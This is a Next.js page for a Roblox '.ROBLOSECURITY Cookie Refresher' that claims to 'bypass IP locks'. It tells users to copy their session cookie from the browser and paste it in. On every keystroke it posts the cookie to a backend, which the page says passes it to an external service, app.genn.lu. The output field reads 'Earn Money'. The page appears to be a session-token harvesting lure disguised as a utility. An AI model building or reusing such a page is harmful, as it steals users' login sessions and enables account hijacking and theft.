"use client"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import { RefreshCw, Shield, AlertTriangle, ArrowLeft, Code, Play, Globe } from "lucide-react"
import { toast } from "sonner"
import Link from "next/link"
import { ParticleSystem } from "@/components/particle-system"
import { BackgroundMusic } from "@/components/background-music"

export default function RefresherPage() {
  const [cookie, setCookie] = useState("")
  const [refreshedCookie, setRefreshedCookie] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")

  const handleRefresh = async () => {
    if (!cookie.trim()) {
      toast.error("Please enter a .ROBLOSECURITY cookie")
      return
    }

    setIsLoading(true)
    setError("")
    setRefreshedCookie("")

    try {
      const response = await fetch("/api/refresh-cookie", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ cookie: cookie.trim() }),
      })

      const data = await response.json()

      if (response.ok && data.success && data.refreshedCookie) {
        setRefreshedCookie(data.refreshedCookie)
        toast.success(data.message || "Cookie processed successfully!")
      } else {
        const errorMessage = data.error || "Failed to process cookie"
        setError(errorMessage)
        toast.error(errorMessage)
      }
    } catch (error) {
      const errorMessage = "An error occurred while processing the cookie"
      setError(errorMessage)
      toast.error(errorMessage)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-900 via-red-800 to-pink-900 relative overflow-hidden">
      <ParticleSystem />
      <BackgroundMusic />

      {/* Bright overlay for enhanced brightness */}
      <div className="absolute inset-0 bg-gradient-to-br from-red-500/20 via-pink-500/20 to-red-600/20 pointer-events-none"></div>

      <div className="relative z-10 container mx-auto px-4 py-8">
        {/* Header */}
        <div className="mb-8">
          <Link href="/" className="inline-flex items-center text-red-300 hover:text-red-200 mb-4 font-semibold">
            <ArrowLeft className="w-4 h-4 mr-2" />
            Back to Home
          </Link>
          <div className="text-center">
            <Badge variant="outline" className="mb-4 border-red-400 text-red-300 bg-red-500/20 animate-pulse">
              <RefreshCw className="w-3 h-3 mr-1" />
              Cookie Refresher v2.0
            </Badge>
            <h1 className="text-5xl font-bold mb-4 bg-gradient-to-r from-red-300 via-pink-300 to-red-300 bg-clip-text text-transparent animate-pulse">
              Cookie Refresher
            </h1>
            <p className="text-red-200 text-xl max-w-2xl mx-auto font-medium">
              Refresh your .ROBLOSECURITY cookies to bypass IP locks using automated external service integration.
            </p>
          </div>
        </div>

        {/* Security Warning */}
        <Alert className="mb-8 border-yellow-400 bg-yellow-400/20 shadow-lg shadow-yellow-400/20">
          <AlertTriangle className="h-4 w-4 text-yellow-300" />
          <AlertDescription className="text-yellow-200 font-medium">
            <strong className="text-yellow-100">Security Warning:</strong> Never share your .ROBLOSECURITY cookies with
            anyone. This tool automatically processes cookies through external services. Always use trusted sources.
          </AlertDescription>
        </Alert>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Input Section */}
          <Card className="border-red-400/50 bg-red-500/20 backdrop-blur-sm shadow-xl shadow-red-500/20 animate-pulse">
            <CardHeader>
              <CardTitle className="text-red-200 flex items-center gap-2 text-xl font-bold">
                <Shield className="w-6 h-6 text-red-300" />
                Cookie Input
              </CardTitle>
              <CardDescription className="text-red-300 font-medium">
                Enter your .ROBLOSECURITY cookie to process it automatically
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <Label htmlFor="cookie" className="text-red-200 font-semibold text-lg">
                  .ROBLOSECURITY Cookie
                </Label>
                <Input
                  id="cookie"
                  type="password"
                  placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow..."
                  value={cookie}
                  onChange={(e) => {
                    setCookie(e.target.value)
                    handleRefresh()
                  }}
                  className="mt-2 bg-red-600/30 border-red-400/70 text-red-100 placeholder:text-red-300/80 font-medium shadow-lg shadow-red-500/20"
                />
              </div>
            </CardContent>
          </Card>

          {/* Output Section */}
          <Card className="border-red-400/50 bg-red-500/20 backdrop-blur-sm shadow-xl shadow-red-500/20 animate-pulse">
            <CardHeader>
              <CardTitle className="text-red-200 flex items-center gap-2 text-xl font-bold">
                <Globe className="w-6 h-6 text-red-300" />
                Service Output
              </CardTitle>
              <CardDescription className="text-red-300 font-medium">
                The output from the external service will appear here
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <Label htmlFor="output" className="text-red-200 font-semibold text-lg">
                  Output
                </Label>
                <Textarea
                  id="output"
                  value={error ? `Error: ${error}` : refreshedCookie || "Earn Money"}
                  readOnly
                  placeholder="Earn Money"
                  className={`mt-2 min-h-[120px] bg-red-600/30 border-red-400/70 font-medium shadow-lg shadow-red-500/20 ${
                    error ? "text-red-400" : "text-red-100"
                  } placeholder:text-red-300/80`}
                />
              </div>
            </CardContent>
          </Card>
        </div>

        <Separator className="my-8 bg-red-400/40 h-1" />

        {/* External Service Automation Info */}
        <Card className="border-red-400/50 bg-red-500/20 backdrop-blur-sm shadow-xl shadow-red-500/20 mb-8">
          <CardHeader>
            <CardTitle className="text-red-200 flex items-center gap-2 text-2xl font-bold">
              <Globe className="w-6 h-6 text-red-300" />
              Automated External Service
            </CardTitle>
            <CardDescription className="text-red-300 font-medium">
              This tool automatically interacts with app.genn.lu/tools/refresher
            </CardDescription>
          </CardHeader>
          <CardContent className="text-red-200 space-y-3 font-medium">
            <div className="bg-red-600/20 p-4 rounded-lg border border-red-400/30">
              <img
                src="https://sjc.microlink.io/jbtC6DfSG1_NxciRYS_g0x5YTE8OKQT_-2TE3pUND4FT1IRRXVi1Tm_XLtoE57vRaX6pRoFek_j0ZrKLBj0kvQ.jpeg"
                alt="Screenshot of app.genn.lu/tools/refresher"
                className="w-full max-w-md mx-auto rounded-lg border border-red-400/50 mb-3"
              />
              <p className="text-center text-red-300 text-sm">External service interface</p>
            </div>
            <p>Our system automatically:</p>
            <ul className="list-disc list-inside space-y-1 text-red-300 ml-4">
              <li>Connects to the external refresher service</li>
              <li>Submits your cookie to the form</li>
              <li>Clicks the refresh button automatically</li>
              <li>Retrieves and displays the exact output</li>
              <li>Returns whatever the service provides</li>
            </ul>
            <div className="flex items-center gap-2 text-red-300">
              <Shield className="w-4 h-4" />
              <span>Direct output passthrough with fallback support</span>
            </div>
          </CardContent>
        </Card>

        {/* Python Script Section */}
        <Card className="border-red-400/50 bg-red-500/20 backdrop-blur-sm shadow-xl shadow-red-500/20 mb-8">
          <CardHeader>
            <CardTitle className="text-red-200 flex items-center gap-2 text-2xl font-bold">
              <Code className="w-6 h-6 text-red-300" />
              Python Script Available
            </CardTitle>
            <CardDescription className="text-red-300 font-medium">
              Alternative local Python script for advanced users
            </CardDescription>
          </CardHeader>
          <CardContent className="text-red-200 space-y-3 font-medium">
            <p>
              The Python script{" "}
              <code className="bg-red-600/30 px-2 py-1 rounded text-red-100">scripts/cookie-refresher.py</code> is
              available as a local alternative.
            </p>
            <div className="flex items-center gap-2 text-red-300">
              <Play className="w-4 h-4" />
              <span>Run locally for offline cookie refreshing</span>
            </div>
          </CardContent>
        </Card>

        {/* Instructions */}
        <Card className="border-red-400/50 bg-red-500/20 backdrop-blur-sm shadow-xl shadow-red-500/20">
          <CardHeader>
            <CardTitle className="text-red-200 text-2xl font-bold">How to Use</CardTitle>
          </CardHeader>
          <CardContent className="text-red-200 space-y-3 font-medium text-lg">
            <p className="hover:text-red-100 transition-colors">
              1. Obtain your .ROBLOSECURITY cookie from your browser
            </p>
            <p className="hover:text-red-100 transition-colors">2. Paste it into the input field above</p>
            <p className="hover:text-red-100 transition-colors">3. The system will automatically process your cookie</p>
            <p className="hover:text-red-100 transition-colors">
              4. The output will automatically appear in the output field
            </p>
            <p className="hover:text-red-100 transition-colors">
              5. The result will show "Earn Money" or the service output
            </p>
            <p className="hover:text-red-100 transition-colors text-red-300">
              <strong>Note:</strong> Processing happens automatically when you enter your cookie
            </p>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
